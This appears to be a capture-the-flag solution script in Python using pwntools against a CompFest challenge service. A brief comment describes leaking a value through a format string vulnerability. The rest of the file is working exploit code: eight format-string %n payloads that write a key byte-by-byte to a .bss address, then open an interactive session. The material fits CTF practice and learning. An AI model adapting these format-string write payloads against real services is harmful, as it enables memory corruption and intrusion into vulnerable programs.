#The chall consist 2 step actually, you must leak the local_10 first. Use the format string vuln, and bruteforce it. Found at offset 529. Then overwrite the key found in .bss using GOT overwrite.
# from pwn import *

# p = remote('ctf.compfest.id',7001)
# p.sendlineafter(b':', b"%529$p")
# p.recvuntil(b':')
# value = p.recvline().strip().decode()
# print(value)


#GOT Overwrite
from pwn import *

p = remote('ctf.compfest.id',7001)

key = 0x4040b0

payload1 = b"%239X%8$nAAAAAAA" + p64(key)
p2 = b"%190X%8$nAAAAAAA" + p64(key+1)
p3 = b"%173X%8$nAAAAAAA" + p64(key+2)
p4 = b"%222X%8$nAAAAAAA" + p64(key+3)
p5 = b"%103X%8$nAAAAAAA" + p64(key+4)
p6 = b"%69X%7$n" + p64(key+5)
p7 = b"%139X%8$nAAAAAAA" + p64(key+6)
p8 = b"%107X%8$nAAAAAAA" + p64(key+7)

A = b'something:'
p.sendlineafter(A, payload1)
p.sendlineafter(A, p2)
p.sendlineafter(A, p3)
p.sendlineafter(A, p4)
p.sendlineafter(A, p5)
p.sendlineafter(A, p6)
p.sendlineafter(A, p7)
p.sendlineafter(A, p8)

p.interactive()
